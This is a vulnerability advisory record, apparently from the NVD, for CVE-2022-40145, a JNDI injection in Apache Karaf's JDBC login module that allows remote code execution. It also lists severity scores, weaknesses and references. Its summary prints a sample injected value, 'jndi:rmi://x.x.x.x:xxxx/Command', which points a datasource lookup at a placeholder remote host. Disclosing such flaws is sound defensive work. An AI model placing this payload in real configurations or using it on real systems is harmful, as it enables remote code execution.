advisory_id: CVE-2022-40145
datasource_id: nvd_importer_v2/CVE-2022-40145
datasource_url: https://nvd.nist.gov/vuln/detail/CVE-2022-40145
aliases: []
summary: |
  This vulnerable is about a potential code injection when an attacker has control of the target LDAP server using in the JDBC JNDI URL.

  The function jaas.modules.src.main.java.porg.apache.karaf.jass.modules.jdbc.JDBCUtils#doCreateDatasource
  use InitialContext.lookup(jndiName) without filtering.
  An user can modify `options.put(JDBCUtils.DATASOURCE, "osgi:" + DataSource.class.getName());` to `options.put(JDBCUtils.DATASOURCE,"jndi:rmi://x.x.x.x:xxxx/Command");` in JdbcLoginModuleTest#setup.

  This is vulnerable to a remote code execution (RCE) attack when a
  configuration uses a JNDI LDAP data source URI when an attacker has
  control of the target LDAP server.This issue affects all versions of Apache Karaf up to 4.4.1 and 4.3.7.

  We encourage the users to upgrade to Apache Karaf at least 4.4.2 or 4.3.8
impacted_packages: []
severities:
  - score: '9.8'
    scoring_system: cvssv3.1
    scoring_elements: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    published_at: None
    url: https://nvd.nist.gov/vuln/detail/CVE-2022-40145
weaknesses:
  - CWE-20
  - CWE-74
references:
  - url: https://karaf.apache.org/security/cve-2022-40145.txt
    reference_type:
    reference_id:
  - url: https://nvd.nist.gov/vuln/search/results?adv_search=true&isCpeNameSearch=true&query=cpe:2.3:a:apache:karaf:*:*:*:*:*:*:*:*
    reference_type:
    reference_id: cpe:2.3:a:apache:karaf:*:*:*:*:*:*:*:*
  - url: https://nvd.nist.gov/vuln/detail/CVE-2022-40145
    reference_type:
    reference_id: CVE-2022-40145
